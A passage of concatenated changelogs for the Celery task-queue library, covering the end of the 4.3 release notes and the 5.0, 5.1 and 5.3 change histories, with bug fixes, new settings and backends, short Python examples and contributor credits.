socket, `celery.concurrency.asynpool.AsynPool`   only removed the queue writer from the hub but did not remove the reader.   This led to a deadlock on the file descriptor   and eventually the worker stopped accepting new tasks.    We now close both the reader and the writer file descriptors in a single loop   iteration which prevents the deadlock.    Contributed by **Joshua Engelman**  - **Celery Beat**: Correctly consider timezone when calculating timestamp.    Contributed by **:github_user:`yywing`**  - **Celery Beat**: `celery.beat.Scheduler.schedules_equal` can now handle   either arguments being a `None` value.    Contributed by **:github_user:` ratson`**  - **Documentation/Sphinx**: Fixed Sphinx support for shared_task decorated functions.    Contributed by **Jon Banafato**  - **New Result Backend**: Added the CosmosDB result backend.    This change adds a new results backend.   The backend is implemented on top of the pydocumentdb library which uses   Azure CosmosDB for a scalable, globally replicated, high-performance,   low-latency and high-throughput PaaS backend.    Contributed by **Clemens Wolff**  - **Application**: Added configuration options to allow separate multiple apps   to run on a single RabbitMQ vhost.    The newly added :setting:`event_exchange` and :setting:`control_exchange`   configuration options allow users to use separate Pidbox exchange   and a separate events exchange.    This allow different Celery applications to run separately on the same vhost.    Contributed by **Artem Vasilyev**  - **Result Backend**: Forget parent result metadata when forgetting   a result.    Contributed by **:github_user:`tothegump`**  - **Task** Store task arguments inside `celery.exceptions.MaxRetriesExceededError`.    Contributed by **Anthony Ruhier**  - **Result Backend**: Added the :setting:`result_accept_content` setting.    This feature allows to configure different accepted content for the result   backend.    A special serializer (`auth`) is used for signed messaging,   however the result_serializer remains in json, because we don't want encrypted   content in our result backend.    To accept unsigned content from the result backend,   we introduced this new configuration option to specify the   accepted content from the backend.    Contributed by **Benjamin Pereto**  - **Canvas**: Fixed error callback processing for class based tasks.    Contributed by **Victor Mireyev**  - **New Result Backend**: Added the S3 result backend.    Contributed by **Florian Chardin**  - **Task**: Added support for Cythonized Celery tasks.    Contributed by **Andrey Skabelin**  - **Riak Result Backend**: Warn Riak backend users for possible Python 3.7 incompatibilities.    Contributed by **George Psarakis**  - **Python Runtime**: Added Python 3.7 support.    Contributed by **Omer Katz** & **Asif Saif Uddin**  - **Auth Serializer**: Revamped the auth serializer.    The auth serializer received a complete overhaul.   It was previously horribly broken.    We now depend on cryptography instead of pyOpenSSL for this serializer.    Contributed by **Benjamin Pereto**  - **Command Line**: :program:`celery report` now reports kernel version along   with other platform details.    Contributed by **Omer Katz**  - **Canvas**: Fixed chords with chains which include sub chords in a group.    Celery now correctly executes the last task in these types of canvases: ``\`python c = chord( group(\[ chain( dummy.si(), chord( group(\[dummy.si(), dummy.si()\]), dummy.si(), ), ), chain( dummy.si(), chord( group(\[dummy.si(), dummy.si()\]), dummy.si(), ), ), \]), dummy.si() )

> c.delay().get()
> 
> Contributed by **Maximilien Cuony**

  - **Canvas**: Complex canvases with error callbacks no longer raises an <span class="title-ref">AttributeError</span>.
    
    Very complex canvases such as [this](https://github.com/merchise/xopgi.base/blob/6634819ad5c701c04bc9baa5c527449070843b71/xopgi/xopgi_cdr/cdr_agent.py#L181) no longer raise an <span class="title-ref">AttributeError</span> which prevents constructing them.
    
    We do not know why this bug occurs yet.
    
    Contributed by **Manuel Vázquez Acosta**

  - **Command Line**: Added proper error messages in cases where app cannot be loaded.
    
    Previously, celery crashed with an exception.
    
    We now print a proper error message.
    
    Contributed by **Omer Katz**

  - **Task**: Added the `task_default_priority` setting.
    
    You can now set the default priority of a task using the `task_default_priority` setting. The setting's value will be used if no priority is provided for a specific task.
    
    Contributed by **:github\_user:\`madprogrammer\`**

  - **Dependencies**: Bump minimum required version of Kombu to 4.3 and Billiard to 3.6.
    
    Contributed by **Asif Saif Uddin**

  - **Result Backend**: Fix memory leak.
    
    We reintroduced weak references to bound methods for AsyncResult callback promises, after adding full weakref support for Python 2 in [vine](https://github.com/celery/vine/tree/v1.2.0). More details can be found in [celery/celery\#4839](https://github.com/celery/celery/pull/4839).
    
    Contributed by **George Psarakis** and **:github\_user:\`monsterxx03\`**.

  - **Task Execution**: Fixed roundtrip serialization for eager tasks.
    
    When doing the roundtrip serialization for eager tasks, the task serializer will always be JSON unless the <span class="title-ref">serializer</span> argument is present in the call to <span class="title-ref">celery.app.task.Task.apply\_async</span>. If the serializer argument is present but is <span class="title-ref">'pickle'</span>, an exception will be raised as pickle-serialized objects cannot be deserialized without specifying to <span class="title-ref">serialization.loads</span> what content types should be accepted. The Producer's <span class="title-ref">serializer</span> seems to be set to <span class="title-ref">None</span>, causing the default to JSON serialization.
    
    We now continue to use (in order) the <span class="title-ref">serializer</span> argument to <span class="title-ref">celery.app.task.Task.apply\_async</span>, if present, or the <span class="title-ref">Producer</span>'s serializer if not <span class="title-ref">None</span>. If the <span class="title-ref">Producer</span>'s serializer is <span class="title-ref">None</span>, it will use the Celery app's <span class="title-ref">task\_serializer</span> configuration entry as the serializer.
    
    Contributed by **Brett Jackson**

  - **Redis Result Backend**: The <span class="title-ref">celery.backends.redis.ResultConsumer</span> class no longer assumes <span class="title-ref">celery.backends.redis.ResultConsumer.start</span> to be called before <span class="title-ref">celery.backends.redis.ResultConsumer.drain\_events</span>.
    
    This fixes a race condition when using the Gevent workers pool.
    
    Contributed by **Noam Kush**

  - **Task**: Added the `task_inherit_parent_priority` setting.
    
    Setting the `task_inherit_parent_priority` configuration option to <span class="title-ref">True</span> will make Celery tasks inherit the priority of the previous task linked to it.
    
    Examples:
    
    ``` python
    c = celery.chain(
      add.s(2), # priority=None
      add.s(3).set(priority=5), # priority=5
      add.s(4), # priority=5
      add.s(5).set(priority=3), # priority=3
      add.s(6), # priority=3
    )
    ```
    
    ``` python
    @app.task(bind=True)
    def child_task(self):
      pass
    
    @app.task(bind=True)
    def parent_task(self):
      child_task.delay()
    
    # child_task will also have priority=5
    parent_task.apply_async(args=[], priority=5)
    ```
    
    Contributed by **:github\_user:\`madprogrammer\`**

  - **Canvas**: Added the `result_chord_join_timeout` setting.
    
    Previously, <span class="title-ref">celery.result.GroupResult.join</span> had a fixed timeout of 3 seconds.
    
    The `result_chord_join_timeout` setting now allows you to change it.
    
    Contributed by **:github\_user:\`srafehi\`**

Code Cleanups, Test Coverage & CI Improvements by:

>   - **Jon Dufresne**
>   - **Asif Saif Uddin**
>   - **Omer Katz**
>   - **Brett Jackson**
>   - **Bruno Alla**
>   - **:github\_user:\`tothegump\`**
>   - **Bojan Jovanovic**
>   - **Florian Chardin**
>   - **:github\_user:\`walterqian\`**
>   - **Fabian Becker**
>   - **Lars Rinn**
>   - **:github\_user:\`madprogrammer\`**
>   - **Ciaran Courtney**

Documentation Fixes by:

>   - **Lewis M. Kabui**
>   - **Dash Winterson**
>   - **Shanavas M**
>   - **Brett Randall**
>   - **Przemysław Suliga**
>   - **Joshua Schmid**
>   - **Asif Saif Uddin**
>   - **Xiaodong**
>   - **Vikas Prasad**
>   - **Jamie Alessio**
>   - **Lars Kruse**
>   - **Guilherme Caminha**
>   - **Andrea Rabbaglietti**
>   - **Itay Bittan**
>   - **Noah Hall**
>   - **Peng Weikang**
>   - **Mariatta Wijaya**
>   - **Ed Morley**
>   - **Paweł Adamczak**
>   - **:github\_user:\`CoffeeExpress\`**
>   - **:github\_user:\`aviadatsnyk\`**
>   - **Brian Schrader**
>   - **Josue Balandrano Coronel**
>   - **Tom Clancy**
>   - **Sebastian Wojciechowski**
>   - **Meysam Azad**
>   - **Willem Thiart**
>   - **Charles Chan**
>   - **Omer Katz**
>   - **Milind Shakya**

\`\`\`

---

changelog-5.0.md

---

# Change history

This document contains change notes for bugfix & new features in the 5.0.x , please see \[whatsnew-5.0\](\#whatsnew-5.0) for an overview of what's new in Celery 5.0.

## 5.0.6

  - release-date  
    2021-06-28 3.00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Inspect commands accept arguments again (\#6710).
  - The `worker_pool` setting is now respected correctly (\#6711).
  - Ensure AMQPContext exposes an app attribute (\#6741).
  - Exit celery with non zero exit value if failing (\#6602).
  - \--quiet flag now actually makes celery avoid producing logs (\#6599).
  - pass\_context for handle\_preload\_options decorator (\#6583).
  - Fix --pool=threads support in command line options parsing (\#6787).
  - Fix the behavior of our json serialization which regressed in 5.0 (\#6561).
  - celery -A app events -c camera now works as expected (\#6774).

## 5.0.5

  - release-date  
    2020-12-16 5.35 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Ensure keys are strings when deleting results from S3 (\#6537).
  - Fix a regression breaking <span class="title-ref">celery --help</span> and <span class="title-ref">celery events</span> (\#6543).

## 5.0.4

  - release-date  
    2020-12-08 2.40 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - DummyClient of cache+memory:// backend now shares state between threads (\#6524).
    
    This fixes a problem when using our pytest integration with the in memory result backend. Because the state wasn't shared between threads, \#6416 results in test suites hanging on <span class="title-ref">result.get()</span>.

## 5.0.3

  - release-date  
    2020-12-03 6.30 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Make <span class="title-ref">--workdir</span> eager for early handling (\#6457).
  - When using the MongoDB backend, don't cleanup if result\_expires is 0 or None (\#6462).
  - Fix passing queues into purge command (\#6469).
  - Restore <span class="title-ref">app.start()</span> and <span class="title-ref">app.worker\_main()</span> (\#6481).
  - Detaching no longer creates an extra log file (\#6426).
  - Result backend instances are now thread local to ensure thread safety (\#6416).
  - Don't upgrade click to 8.x since click-repl doesn't support it yet.
  - Restore preload options (\#6516).

## 5.0.2

  - release-date  
    2020-11-02 8.00 P.M UTC+2:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Fix \_autodiscover\_tasks\_from\_fixups (\#6424).

  - Flush worker prints, notably the banner (\#6432).

  - **Breaking Change**: Remove <span class="title-ref">ha\_policy</span> from queue definition. (\#6440)
    
    > This argument has no effect since RabbitMQ 3.0. Therefore, We feel comfortable dropping it in a patch release.

  - Python 3.9 support (\#6418).

  - **Regression**: When using the prefork pool, pick the fair scheduling strategy by default (\#6447).

  - Preserve callbacks when replacing a task with a chain (\#6189).

  - Fix max\_retries override on <span class="title-ref">self.retry()</span> (\#6436).

  - Raise proper error when replacing with an empty chain (\#6452)

## 5.0.1

  - release-date  
    2020-10-18 1.00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Specify UTF-8 as the encoding for log files (\#6357).
  - Custom headers now propagate when using the protocol 1 hybrid messages (\#6374).
  - Retry creating the database schema for the database results backend in case of a race condition (\#6298).
  - When using the Redis results backend, awaiting for a chord no longer hangs when setting `result_expires` to 0 (\#6373).
  - When a user tries to specify the app as an option for the subcommand, a custom error message is displayed (\#6363).
  - Fix the <span class="title-ref">--without-gossip</span>, <span class="title-ref">--without-mingle</span>, and <span class="title-ref">--without-heartbeat</span> options which now work as expected. (\#6365)
  - Provide a clearer error message when the application cannot be loaded.
  - Avoid printing deprecation warnings for settings when they are loaded from Django settings (\#6385).
  - Allow lowercase log levels for the <span class="title-ref">--loglevel</span> option (\#6388).
  - Detaching now works as expected (\#6401).
  - Restore broadcasting messages from <span class="title-ref">celery control</span> (\#6400).
  - Pass back real result for single task chains (\#6411).
  - Ensure group tasks a deeply serialized (\#6342).
  - Fix chord element counting (\#6354).
  - Restore the <span class="title-ref">celery shell</span> command (\#6421).

## 5.0.0

  - release-date  
    2020-09-24 6.00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - **Breaking Change** Remove AMQP result backend (\#6360).
  - Warn when deprecated settings are used (\#6353).
  - Expose retry\_policy for Redis result backend (\#6330).
  - Prepare Celery to support the yet to be released Python 3.9 (\#6328).

## 5.0.0rc3

  - release-date  
    2020-09-07 4.00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - More cleanups of leftover Python 2 support (\#6338).

## 5.0.0rc2

  - release-date  
    2020-09-01 6.30 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Bump minimum required eventlet version to 0.26.1.
  - Update Couchbase Result backend to use SDK V3.
  - Restore monkeypatching when gevent or eventlet are used.

## 5.0.0rc1

  - release-date  
    2020-08-24 9.00 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Allow to opt out of ordered group results when using the Redis result backend (\#6290).
  - **Breaking Change** Remove the deprecated celery.utils.encoding module.

## 5.0.0b1

  - release-date  
    2020-08-19 8.30 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - **Breaking Change** Drop support for the Riak result backend (\#5686).
  - **Breaking Change** pytest plugin is no longer enabled by default (\#6288). Install pytest-celery to enable it.
  - **Breaking Change** Brand new CLI based on Click (\#5718).

## 5.0.0a2

  - release-date  
    2020-08-05 7.15 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Bump Kombu version to 5.0 (\#5686).

## 5.0.0a1

  - release-date  
    2020-08-02 9.30 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Removed most of the compatibility code that supports Python 2 (\#5686).
  - Modernized code to work on Python 3.6 and above (\#5686).

---

changelog-5.1.md

---

# Change history

This document contains change notes for bugfix & new features in the & 5.1.x series, please see \[whatsnew-5.1\](\#whatsnew-5.1) for an overview of what's new in Celery 5.1.

## 5.1.2

  - release-date  
    2021-06-28 16.15 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - When chords fail, correctly call errbacks. (\#6814)
    
    > We had a special case for calling errbacks when a chord failed which assumed they were old style. This change ensures that we call the proper errback dispatch method which understands new and old style errbacks, and adds test to confirm that things behave as one might expect now.

  - Avoid using the `Event.isSet()` deprecated alias. (\#6824)

  - Reintroduce sys.argv default behaviour for `Celery.start()`. (\#6825)

## 5.1.1

  - release-date  
    2021-06-17 16.10 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Fix `--pool=threads` support in command line options parsing. (\#6787)

  - Fix `LoggingProxy.write()` return type. (\#6791)

  - Couchdb key is now always coerced into a string. (\#6781)

  -   - grp is no longer imported unconditionally. (\#6804)  
        This fixes a regression in 5.1.0 when running Celery in non-unix systems.

  - Ensure regen utility class gets marked as done when concertised. (\#6789)

  - Preserve call/errbacks of replaced tasks. (\#6770)

  - Use single-lookahead for regen consumption. (\#6799)

  - Revoked tasks are no longer incorrectly marked as retried. (\#6812, \#6816)

## 5.1.0

  - release-date  
    2021-05-23 19.20 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - `celery -A app events -c camera` now works as expected. (\#6774)
  - Bump minimum required Kombu version to 5.1.0.

## 5.1.0rc1

  - release-date  
    2021-05-02 16.06 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Celery Mailbox accept and serializer parameters are initialized from configuration. (\#6757)
  - Error propagation and errback calling for group-like signatures now works as expected. (\#6746)
  - Fix sanitization of passwords in sentinel URIs. (\#6765)
  - Add LOG\_RECEIVED to customize logging. (\#6758)

## 5.1.0b2

  - release-date  
    2021-05-02 16.06 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Fix the behavior of our json serialization which regressed in 5.0. (\#6561)
  - Add support for SQLAlchemy 1.4. (\#6709)
  - Safeguard against schedule entry without kwargs. (\#6619)
  - `task.apply_async(ignore_result=True)` now avoids persisting the results. (\#6713)
  - Update systemd tmpfiles path. (\#6688)
  - Ensure AMQPContext exposes an app attribute. (\#6741)
  - Inspect commands accept arguments again (\#6710).
  - Chord counting of group children is now accurate. (\#6733)
  - Add a setting `worker_cancel_long_running_tasks_on_connection_loss` to terminate tasks with late acknowledgement on connection loss. (\#6654)
  - The `task-revoked` event and the `task_revoked` signal are not duplicated when `Request.on_failure` is called. (\#6654)
  - Restore pickling support for `Retry`. (\#6748)
  - Add support in the redis result backend for authenticating with a username. (\#6750)
  - The `worker_pool` setting is now respected correctly. (\#6711)

## 5.1.0b1

  - release-date  
    2021-04-02 10.25 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Add sentinel\_kwargs to Redis Sentinel docs.
  - Depend on the maintained python-consul2 library. (\#6544).
  - Use result\_chord\_join\_timeout instead of hardcoded default value.
  - Upgrade AzureBlockBlob storage backend to use Azure blob storage library v12 (\#6580).
  - Improved integration tests.
  - pass\_context for handle\_preload\_options decorator (\#6583).
  - Makes regen less greedy (\#6589).
  - Pytest worker shutdown timeout (\#6588).
  - Exit celery with non zero exit value if failing (\#6602).
  - Raise BackendStoreError when set value is too large for Redis.
  - Trace task optimizations are now set via Celery app instance.
  - Make trace\_task\_ret and fast\_trace\_task public.
  - reset\_worker\_optimizations and create\_request\_cls has now app as optional parameter.
  - Small refactor in exception handling of on\_failure (\#6633).
  - Fix for issue \#5030 "Celery Result backend on Windows OS".
  - Add store\_eager\_result setting so eager tasks can store result on the result backend (\#6614).
  - Allow heartbeats to be sent in tests (\#6632).
  - Fixed default visibility timeout note in sqs documentation.
  - Support Redis Sentinel with SSL.
  - Simulate more exhaustive delivery info in apply().
  - Start chord header tasks as soon as possible (\#6576).
  - Forward shadow option for retried tasks (\#6655).
  - \--quiet flag now actually makes celery avoid producing logs (\#6599).
  - Update platforms.py "superuser privileges" check (\#6600).
  - Remove unused property <span class="title-ref">autoregister</span> from the Task class (\#6624).
  - fnmatch.translate() already translates globs for us. (\#6668).
  - Upgrade some syntax to Python 3.6+.
  - Add <span class="title-ref">azureblockblob\_base\_path</span> config (\#6669).
  - Fix checking expiration of X.509 certificates (\#6678).
  - Drop the lzma extra.
  - Fix JSON decoding errors when using MongoDB as backend (\#6675).
  - Allow configuration of RedisBackend's health\_check\_interval (\#6666).
  - Safeguard against schedule entry without kwargs (\#6619).
  - Docs only - SQS broker - add STS support (\#6693) through kombu.
  - Drop fun\_accepts\_kwargs backport.
  - Tasks can now have required kwargs at any order (\#6699).
  - Min py-amqp 5.0.6.
  - min billiard is now 3.6.4.0.
  - Minimum kombu now is5.1.0b1.
  - Numerous docs fixes.
  - Moved CI to github action.
  - Updated deployment scripts.
  - Updated docker.
  - Initial support of python 3.9 added.

---

changelog-5.3.md

---

# Change history

This document contains change notes for bugfix & new features in the & 5.3.x series, please see \[whatsnew-5.3\](\#whatsnew-5.3) for an overview of what's new in Celery 5.3.

## 5.3.6

  - release-date  
    2023-11-22 9:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

This release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. The code changes are mostly fix for regressions. More details can be found below.

  - Increased docker-build CI job timeout from 30m -\> 60m (\#8635)
  - Incredibly minor spelling fix. (\#8649)
  - Fix non-zero exit code when receiving remote shutdown (\#8650)
  - Update task.py get\_custom\_headers missing 'compression' key (\#8633)
  - Update kombu\>=5.3.4 to fix SQS request compatibility with boto JSON serializer (\#8646)
  - test requirements version update (\#8655)
  - Update elasticsearch version (\#8656)
  - Propagates more ImportErrors during autodiscovery (\#8632)

## 5.3.5

  - release-date  
    2023-11-10 7:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Update test.txt versions (\#8481)
  - fix os.getcwd() FileNotFoundError (\#8448)
  - Fix typo in CONTRIBUTING.rst (\#8494)
  - typo(doc): configuration.rst (\#8484)
  - assert before raise (\#8495)
  - Update GHA checkout version (\#8496)
  - Fixed replaced\_task\_nesting (\#8500)
  - Fix code indentation for route\_task() example (\#8502)
  - support redis 5.x (\#8504)
  - Fix typos in test\_canvas.py (\#8498)
  - Marked flaky tests (\#8508)
  - Fix typos in calling.rst (\#8506)
  - Added support for replaced\_task\_nesting in chains (\#8501)
  - Fix typos in canvas.rst (\#8509)
  - Patch Version Release Checklist (\#8488)
  - Added Python 3.11 support to Dockerfile (\#8511)
  - Dependabot (Celery) (\#8510)
  - Bump actions/checkout from 3 to 4 (\#8512)
  - Update ETA example to include timezone (\#8516)
  - Replaces datetime.fromisoformat with the more lenient dateutil parser (\#8507)
  - Fixed indentation in Dockerfile for Python 3.11 (\#8527)
  - Fix git bug in Dockerfile (\#8528)
  - Tox lint upgrade from Python 3.9 to Python 3.11 (\#8526)
  - Document gevent concurrency (\#8520)
  - Update test.txt (\#8530)
  - Celery Docker Upgrades (\#8531)
  - pyupgrade upgrade v3.11.0 -\> v3.13.0 (\#8535)
  - Update msgpack.txt (\#8548)
  - Update auth.txt (\#8547)
  - Update msgpack.txt to fix build issues (\#8552)
  - Basic ElasticSearch / ElasticClient 8.x Support (\#8519)
  - Fix eager tasks does not populate name field (\#8486)
  - Fix typo in celery.app.control (\#8563)
  - Update solar.txt ephem (\#8566)
  - Update test.txt pytest-timeout (\#8565)
  - Correct some mypy errors (\#8570)
  - Update elasticsearch.txt (\#8573)
  - Update test.txt deps (\#8574)
  - Update test.txt (\#8590)
  - Improved the "Next steps" documentation (\#8561). (\#8600)
  - Disabled couchbase tests due to broken package breaking main (\#8602)
  - Update elasticsearch deps (\#8605)
  - Update cryptography==41.0.5 (\#8604)
  - Update pytest==7.4.3 (\#8606)
  - test initial support of python 3.12.x (\#8549)
  - updated new versions to fix CI (\#8607)
  - Update zstd.txt (\#8609)
  - Fixed CI Support with Python 3.12 (\#8611)
  - updated CI, docs and classifier for next release (\#8613)
  - updated dockerfile to add python 3.12 (\#8614)
  - lint,mypy,docker-unit-tests -\> Python 3.12 (\#8617)
  - Correct type of <span class="title-ref">request</span> in <span class="title-ref">task\_revoked</span> documentation (\#8616)
  - update docs docker image (\#8618)
  - Fixed RecursionError caused by giving <span class="title-ref">config\_from\_object</span> nested mod… (\#8619)
  - Fix: serialization error when gossip working (\#6566)
  - \[documentation\] broker\_connection\_max\_retries of 0 does not mean "retry forever" (\#8626)
  - added 2 debian package for better stability in Docker (\#8629)

## 5.3.4

  - release-date  
    2023-09-03 10:10 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:

  - Revert "store children with database backend" (\#8475)
  - Revert "Fix eager tasks does not populate name field" (\#8476)

</div>

  - Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
  - User guide fix (hotfix for \#1755) (\#8342)
  - store children with database backend (\#8338)
  - Stamping bugfix with group/chord header errback linking (\#8347)
  - Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
  - Fixing minor typo in code example in calling.rst (\#8366)
  - add documents for timeout settings (\#8373)
  - fix: copyright year (\#8380)
  - setup.py: enable include\_package\_data (\#8379)
  - Fix eager tasks does not populate name field (\#8383)
  - Update test.txt dependencies (\#8389)
  - Update auth.txt deps (\#8392)
  - Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
  - Support preload options for shell and purge commands (\#8374)
  - Implement safer ArangoDB queries (\#8351)
  - integration test: cleanup worker after test case (\#8361)
  - Added "Tomer Nosrati" to CONTRIBUTORS.txt (\#8400)
  - Update README.rst (\#8404)
  - Update README.rst (\#8408)
  - fix(canvas): add group index when unrolling tasks (\#8427)
  - fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
  - Lint fixes & pre-commit autoupdate (\#8414)
  - Update auth.txt (\#8435)
  - Update mypy on test.txt (\#8438)
  - added missing kwargs arguments in some cli cmd (\#8049)
  - Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
  - Docs: rewrite out-of-date code (\#8441)
  - Limit redis client to 4.x since 5.x fails the test suite (\#8442)
  - Limit tox to \< 4.9 (\#8443)
  - Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren’t reliable (\#8446)
  - doc update from \#7651 (\#8451)
  - Remove tox version limit (\#8464)
  - Fixed AttributeError: 'str' object has no attribute (\#8463)
  - Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)
  - Document need for [CELERY]() prefix on CLI env vars (\#8469)
  - Use string value for CELERY\_SKIP\_CHECKS envvar (\#8462)
  - Revert "store children with database backend" (\#8475)
  - Revert "Fix eager tasks does not populate name field" (\#8476)
  - Update Changelog (\#8474)
  - Remove as it seems to be buggy. (\#8340)
  - Revert "Add Semgrep to CI" (\#8477)
  - Revert "Revert "Add Semgrep to CI"" (\#8478)

## 5.3.3 (Yanked)

  - release-date  
    2023-08-31 1:47 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has been yanked due to breaking API changes. The breaking changes include:

  - Store children with database backend (\#8338)
  - Fix eager tasks does not populate name field (\#8383)

</div>

  - Fixed changelog for 5.3.2 release docs.

## 5.3.2 (Yanked)

  - release-date  
    2023-08-31 1:30 P.M GMT+2

  - release-by  
    Tomer Nosrati

<div class="warning">

<div class="title">

Warning

</div>

This version has been yanked due to breaking API changes. The breaking changes include:

  - Store children with database backend (\#8338)
  - Fix eager tasks does not populate name field (\#8383)

</div>

  - Bugfix: Removed unecessary stamping code from \_chord.run() (\#8339)
  - User guide fix (hotfix for \#1755) (\#8342)
  - Store children with database backend (\#8338)
  - Stamping bugfix with group/chord header errback linking (\#8347)
  - Use argsrepr and kwargsrepr in LOG\_RECEIVED (\#8301)
  - Fixing minor typo in code example in calling.rst (\#8366)
  - Add documents for timeout settings (\#8373)
  - Fix: copyright year (\#8380)
  - Setup.py: enable include\_package\_data (\#8379)
  - Fix eager tasks does not populate name field (\#8383)
  - Update test.txt dependencies (\#8389)
  - Update auth.txt deps (\#8392)
  - Fix backend.get\_task\_meta ignores the result\_extended config parameter in mongodb backend (\#8391)
  - Support preload options for shell and purge commands (\#8374)
  - Implement safer ArangoDB queries (\#8351)
  - Integration test: cleanup worker after test case (\#8361)
  - Added "Tomer Nosrati" to CONTRIBUTORS.txt (\#8400)
  - Update README.rst (\#8404)
  - Update README.rst (\#8408)
  - Fix(canvas): add group index when unrolling tasks (\#8427)
  - Fix(beat): debug statement should only log AsyncResult.id if it exists (\#8428)
  - Lint fixes & pre-commit autoupdate (\#8414)
  - Update auth.txt (\#8435)
  - Update mypy on test.txt (\#8438)
  - Added missing kwargs arguments in some cli cmd (\#8049)
  - Fix \#8431: Set format\_date to False when calling \_get\_result\_meta on mongo backend (\#8432)
  - Docs: rewrite out-of-date code (\#8441)
  - Limit redis client to 4.x since 5.x fails the test suite (\#8442)
  - Limit tox to \< 4.9 (\#8443)
  - Fixed issue: Flags broker\_connection\_retry\_on\_startup & broker\_connection\_retry aren’t reliable (\#8446)
  - Doc update from \#7651 (\#8451)
  - Remove tox version limit (\#8464)
  - Fixed AttributeError: 'str' object has no attribute (\#8463)
  - Upgraded Kombu from 5.3.1 -\> 5.3.2 (\#8468)

## 5.3.1

  - release-date  
    2023-06-18 8:15 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Upgrade to latest pycurl release (\#7069).
  - Limit librabbitmq\>=2.0.0; python\_version \< '3.11' (\#8302).
  - Added initial support for python 3.11 (\#8304).
  - ChainMap observers fix (\#8305).
  - Revert optimization CLI flag behaviour back to original.
  - Restrict redis 4.5.5 as it has severe bugs (\#8317).
  - Tested pypy 3.10 version in CI (\#8320).
  - Bump new version of kombu to 5.3.1 (\#8323).
  - Fixed a small float value of retry\_backoff (\#8295).
  - Limit pyro4 up to python 3.10 only as it is (\#8324).

## 5.3.0

  - release-date  
    2023-06-06 12:00 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Test kombu 5.3.0 & minor doc update (\#8294).
  - Update librabbitmq.txt \> 2.0.0 (\#8292).
  - Upgrade syntax to py3.8 (\#8281).

## 5.3.0rc2

  - release-date  
    2023-05-31 9:00 P.M GMT+6

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Add missing dependency.
  - Fix exc\_type being the exception instance rather.
  - Fixed revoking tasks by stamped headers (\#8269).
  - Support sqlalchemy 2.0 in tests (\#8271).
  - Fix docker (\#8275).
  - Update redis.txt to 4.5 (\#8278).
  - Update kombu\>=5.3.0rc2.

## 5.3.0rc1

  - release-date  
    2023-05-11 4:24 P.M GMT+2

  - release-by  
    Tomer Nosrati

<!-- end list -->

  - fix functiom name by @cuishuang in \#8087
  - Update CELERY\_TASK\_EAGER setting in user guide by @thebalaa in \#8085
  - Stamping documentation fixes & cleanups by @Nusnus in \#8092
  - switch to maintained pyro5 by @auvipy in \#8093
  - udate dependencies of tests by @auvipy in \#8095
  - cryptography==39.0.1 by @auvipy in \#8096
  - Annotate celery/security/certificate.py by @Kludex in \#7398
  - Deprecate parse\_iso8601 in favor of fromisoformat by @stumpylog in \#8098
  - pytest==7.2.2 by @auvipy in \#8106
  - Type annotations for celery/utils/text.py by @max-muoto in \#8107
  - Update web framework URLs by @sblondon in \#8112
  - Fix contribution URL by @sblondon in \#8111
  - Trying to clarify CERT\_REQUIRED by @pamelafox in \#8113
  - Fix potential AttributeError on 'stamps' by @Darkheir in \#8115
  - Type annotations for celery/apps/beat.py by @max-muoto in \#8108
  - Fixed bug where retrying a task loses its stamps by @Nusnus in \#8120
  - Type hints for celery/schedules.py by @max-muoto in \#8114
  - Reference Gopher Celery in README by @marselester in \#8131
  - Update sqlalchemy.txt by @auvipy in \#8136
  - azure-storage-blob 12.15.0 by @auvipy in \#8137
  - test kombu 5.3.0b3 by @auvipy in \#8138
  - fix: add expire string parse. by @Bidaya0 in \#8134
  - Fix worker crash on un-pickleable exceptions by @youtux in \#8133
  - CLI help output: avoid text rewrapping by click by @woutdenolf in \#8152
  - Warn when an unnamed periodic task override another one. by @iurisilvio in \#8143
  - Fix Task.handle\_ignore not wrapping exceptions properly by @youtux in \#8149
  - Hotfix for (\#8120) - Stamping bug with retry by @Nusnus in \#8158
  - Fix integration test by @youtux in \#8156
  - Fixed bug in revoke\_by\_stamped\_headers where impl did not match doc by @Nusnus in \#8162
  - Align revoke and revoke\_by\_stamped\_headers return values (terminate=True) by @Nusnus in \#8163
  - Update & simplify GHA pip caching by @stumpylog in \#8164
  - Update auth.txt by @auvipy in \#8167
  - Update test.txt versions by @auvipy in \#8173
